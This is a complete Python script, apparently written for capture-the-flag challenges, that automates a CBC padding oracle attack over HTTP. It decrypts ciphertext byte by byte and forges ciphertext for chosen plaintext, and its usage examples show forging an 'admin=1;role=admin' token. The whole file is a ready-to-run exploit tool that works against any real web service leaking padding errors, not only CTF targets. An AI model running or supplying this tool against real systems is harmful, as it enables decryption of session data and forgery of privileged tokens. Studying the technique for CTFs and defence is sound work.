#!/usr/bin/env python3
"""
padding_oracle.py — automated CBC padding oracle attack
Given an HTTP endpoint that leaks padding validity, decrypts ciphertext
and optionally forges arbitrary plaintext.
Usage: point at a CTF challenge's encrypt/decrypt endpoint.
"""

import sys
import re
import time
import base64
import argparse
import urllib.request
import urllib.parse
import urllib.error
from pathlib import Path

FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,10}\{[^}]+\}', re.IGNORECASE)

# ── HTTP oracle helpers ───────────────────────────────────────────────────────

def http_request(
    url: str,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict | None = None,
    cookies: str | None = None,
    timeout: int = 10,
) -> tuple[int, bytes]:
    req_headers = {"User-Agent": "Mozilla/5.0"}
    if headers:
        req_headers.update(headers)
    if cookies:
        req_headers["Cookie"] = cookies
    if data and "Content-Type" not in req_headers:
        req_headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def encode_ct(ct: bytes, encoding: str) -> str:
    if encoding == "hex":
        return ct.hex()
    elif encoding == "base64":
        return base64.b64encode(ct).decode()
    elif encoding == "base64url":
        return base64.urlsafe_b64encode(ct).decode()
    elif encoding == "base64-no-pad":
        return base64.b64encode(ct).decode().rstrip("=")
    return ct.hex()

# ── Oracle function builders ──────────────────────────────────────────────────

def build_oracle(args):
    """
    Returns a callable oracle(ciphertext_bytes) -> bool
    True  = valid padding (no padding error)
    False = invalid padding
    """
    valid_codes   = set(int(c) for c in args.valid_status.split(","))
    invalid_codes = set(int(c) for c in args.invalid_status.split(",")) if args.invalid_status else set()

    def oracle(ct: bytes) -> bool:
        encoded = encode_ct(ct, args.encoding)

        # Build URL or POST body
        if args.param:
            if args.method.upper() == "GET":
                sep = "&" if "?" in args.url else "?"
                url = f"{args.url}{sep}{args.param}={urllib.parse.quote(encoded, safe='')}"
                body = None
            else:
                url = args.url
                body = f"{args.param}={urllib.parse.quote(encoded, safe='')}".encode()
        else:
            url = args.url.replace("CIPHERTEXT", urllib.parse.quote(encoded, safe=""))
            body = None

        status, response = http_request(
            url, method=args.method.upper(), data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"} if body else {},
            cookies=args.cookie, timeout=args.timeout
        )

        if args.error_string:
            return args.error_string.encode() not in response
        if invalid_codes:
            return status not in invalid_codes
        return status in valid_codes

    return oracle

# ── CBC Padding Oracle Attack ─────────────────────────────────────────────────

def pkcs7_unpad(data: bytes) -> bytes:
    if not data:
        return data
    pad_len = data[-1]
    if pad_len == 0 or pad_len > 16:
        return data
    if data[-pad_len:] != bytes([pad_len] * pad_len):
        return data
    return data[:-pad_len]

def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)

def decrypt_block(oracle, prev_block: bytes, curr_block: bytes, block_size: int, verbose: bool, delay: float) -> bytes:
    """Decrypt one block using padding oracle. Returns plaintext block."""
    intermediate = bytearray(block_size)
    plaintext    = bytearray(block_size)

    for byte_pos in range(block_size - 1, -1, -1):
        pad_byte = block_size - byte_pos
        found = False

        # Craft prefix: bytes we already know set correct padding
        suffix = bytearray(block_size - byte_pos - 1)
        for j in range(byte_pos + 1, block_size):
            suffix[j - byte_pos - 1] = intermediate[j] ^ pad_byte

        for guess in range(256):
            prefix = bytearray(byte_pos)  # zeros for untouched bytes
            crafted_prev = prefix + bytearray([guess]) + suffix
            ct_probe = bytes(crafted_prev) + curr_block

            if delay:
                time.sleep(delay)

            if oracle(ct_probe):
                # Verify it's not a false positive on the previous pad byte
                if byte_pos > 0:
                    # Flip an earlier byte and re-test
                    check = bytearray(crafted_prev)
                    check[byte_pos - 1] ^= 1
                    if not oracle(bytes(check) + curr_block):
                        continue
                intermediate[byte_pos] = guess ^ pad_byte
                plaintext[byte_pos]    = intermediate[byte_pos] ^ prev_block[byte_pos]
                if verbose:
                    print(f"    byte[{byte_pos:02d}] = 0x{plaintext[byte_pos]:02x} "
                          f"({chr(plaintext[byte_pos]) if 0x20<=plaintext[byte_pos]<=0x7e else '?'})"
                          f"  (guess=0x{guess:02x})")
                found = True
                break

        if not found:
            if verbose:
                print(f"    byte[{byte_pos:02d}] = ?? (no valid padding found)")
            intermediate[byte_pos] = 0
            plaintext[byte_pos]    = 0

    return bytes(plaintext)

def decrypt_cbc(oracle, iv: bytes, ciphertext: bytes, block_size: int = 16,
                verbose: bool = False, delay: float = 0.0) -> bytes:
    """Full CBC decryption via padding oracle."""
    assert len(ciphertext) % block_size == 0, "Ciphertext length must be a multiple of block size"
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    prev   = iv
    plaintext = b""

    for i, block in enumerate(blocks):
        print(f"\n[*] Decrypting block {i+1}/{len(blocks)}...")
        pt_block = decrypt_block(oracle, prev, block, block_size, verbose, delay)
        plaintext += pt_block
        prev = block
        partial = plaintext.decode("utf-8", errors="replace")
        print(f"    -> {''.join(c if 0x20<=ord(c)<=0x7e else '.' for c in partial[-block_size:])}")

    return pkcs7_unpad(plaintext)

def encrypt_cbc(oracle, iv: bytes, ciphertext: bytes, target_plain: bytes,
                block_size: int = 16, verbose: bool = False, delay: float = 0.0) -> bytes:
    """
    Forge a ciphertext that decrypts to target_plain using padding oracle.
    Requires the oracle to still work (decrypt side).
    """
    target = pkcs7_pad(target_plain, block_size)
    blocks = [target[i:i+block_size] for i in range(0, len(target), block_size)]
    # Work backwards: last block decrypts to last plaintext block
    # We control the previous ciphertext block
    forged_blocks = [b"\x00" * block_size]  # dummy last block (will be refined)

    result_blocks = [b"\x00" * block_size]  # the 'ciphertext' we're building (last block unknown)

    # For each target block from last to first
    for bi in range(len(blocks) - 1, -1, -1):
        target_block = blocks[bi]
        # We need to find a prev_block such that decrypt(prev_block, next_cipher) = target_block
        next_cipher = result_blocks[0]  # the block that follows in the chain
        # First decrypt next_cipher with a zero prev to get intermediate
        print(f"\n[*] Forging block {bi+1}/{len(blocks)}...")
        intermediate = decrypt_block(oracle, b"\x00" * block_size, next_cipher, block_size, verbose, delay)
        # XOR intermediate with target to get the prev block we need
        forged_prev = bytes(intermediate[j] ^ target_block[j] for j in range(block_size))
        result_blocks.insert(0, forged_prev)

    # result_blocks[0] is the forged IV, result_blocks[1:] is the forged ciphertext
    forged_iv = result_blocks[0]
    forged_ct = b"".join(result_blocks[1:])
    return forged_iv, forged_ct

# ── Input parsing ─────────────────────────────────────────────────────────────

def parse_ciphertext(s: str) -> bytes:
    s = s.strip()
    for dec in [
        lambda x: bytes.fromhex(x),
        lambda x: base64.b64decode(x + "=="),
        lambda x: base64.urlsafe_b64decode(x + "=="),
    ]:
        try:
            result = dec(re.sub(r'\s', '', s))
            if len(result) > 0:
                return result
        except Exception:
            pass
    raise ValueError(f"Cannot parse ciphertext: {s[:40]}")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="CBC Padding Oracle attack — decrypt or forge ciphertext via HTTP oracle",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Decrypt a ciphertext
  python3 padding_oracle.py \\
    --url "http://ctf.example.com/decrypt?ct=CIPHERTEXT" \\
    --ciphertext aabbcc...00 --iv 00000000000000000000000000000000 \\
    --error-string "Invalid padding"

  # POST parameter
  python3 padding_oracle.py \\
    --url "http://ctf.example.com/check" --method POST --param token \\
    --ciphertext aabbcc...00 --invalid-status 403 \\
    --forge "admin=1;role=admin"
        """
    )
    parser.add_argument("--url", required=True, help="Oracle URL (use CIPHERTEXT as placeholder for GET)")
    parser.add_argument("--ciphertext", required=True, help="Hex or base64 ciphertext to decrypt")
    parser.add_argument("--iv", default=None, help="IV (hex or base64). If omitted, first block used as IV.")
    parser.add_argument("--block-size", type=int, default=16, help="Block size in bytes (default: 16)")
    parser.add_argument("--method", default="GET", choices=["GET","POST","PUT"], help="HTTP method")
    parser.add_argument("--param", default=None, help="Parameter name to inject ciphertext into")
    parser.add_argument("--encoding", default="hex",
                        choices=["hex","base64","base64url","base64-no-pad"],
                        help="How to encode ciphertext in the request (default: hex)")
    parser.add_argument("--valid-status", default="200",
                        help="HTTP status codes that mean VALID padding (comma-separated, default: 200)")
    parser.add_argument("--invalid-status", default=None,
                        help="HTTP status codes that mean INVALID padding (comma-separated)")
    parser.add_argument("--error-string", default=None,
                        help="Response body string that indicates INVALID padding")
    parser.add_argument("--cookie", default=None, help="Cookie header value")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Delay between requests in seconds (rate limiting, default: 0)")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout (default: 10s)")
    parser.add_argument("--forge", default=None,
                        help="Plaintext to forge an encrypted ciphertext for")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show per-byte progress")
    parser.add_argument("-o", "--output", default=None, help="Save decrypted output to file")
    args = parser.parse_args()

    # Parse ciphertext + IV
    raw_ct = parse_ciphertext(args.ciphertext)
    bs = args.block_size

    if args.iv:
        iv = parse_ciphertext(args.iv)
        ct = raw_ct
    else:
        # First block is IV
        iv = raw_ct[:bs]
        ct = raw_ct[bs:]

    if len(ct) % bs != 0:
        print(f"[!] Ciphertext length ({len(ct)}) is not a multiple of block size ({bs})")
        sys.exit(1)

    print(f"[*] URL:        {args.url}")
    print(f"[*] IV:         {iv.hex()}")
    print(f"[*] Ciphertext: {ct.hex()} ({len(ct)} bytes, {len(ct)//bs} blocks)")
    print(f"[*] Encoding:   {args.encoding}  Method: {args.method}")

    oracle = build_oracle(args)

    # Sanity check
    print(f"\n[*] Testing oracle with original ciphertext (should be VALID)...")
    test_valid = oracle(iv + ct)
    print(f"    -> {'VALID (good)' if test_valid else 'INVALID — check your oracle settings!'}")
    if not test_valid:
        print("[!] Oracle returned invalid for the original ciphertext.")
        print("[!] Check --valid-status, --invalid-status, or --error-string.")

    if args.forge:
        # Encryption / forgery mode
        print(f"\n[*] FORGE MODE — target plaintext: {args.forge!r}")
        target = args.forge.encode("utf-8")
        forged_iv, forged_ct = encrypt_cbc(oracle, iv, ct, target, bs, args.verbose, args.delay)
        combined = forged_iv + forged_ct
        print(f"\n[*] Forged ciphertext (hex):       {combined.hex()}")
        print(f"[*] Forged ciphertext (base64):    {base64.b64encode(combined).decode()}")
        print(f"[*] Forged ciphertext (base64url): {base64.urlsafe_b64encode(combined).decode()}")
        if args.output:
            Path(args.output).write_bytes(combined)
            print(f"[*] Saved to {args.output}")
    else:
        # Decryption mode
        print(f"\n[*] DECRYPT MODE")
        plaintext = decrypt_cbc(oracle, iv, ct, bs, args.verbose, args.delay)

        print(f"\n{'='*60}")
        print(f"[*] Decrypted plaintext:")
        try:
            text = plaintext.decode("utf-8")
        except Exception:
            text = plaintext.decode("latin-1", errors="replace")
        print(text)
        print(f"[*] Hex: {plaintext.hex()}")

        flags = FLAG_RE.findall(text)
        if flags:
            print(f"\n[!!!] FLAGS FOUND:")
            for f in flags:
                print(f"  >>> {f}")

        if args.output:
            Path(args.output).write_bytes(plaintext)
            print(f"[*] Saved to {args.output}")

if __name__ == "__main__":
    main()
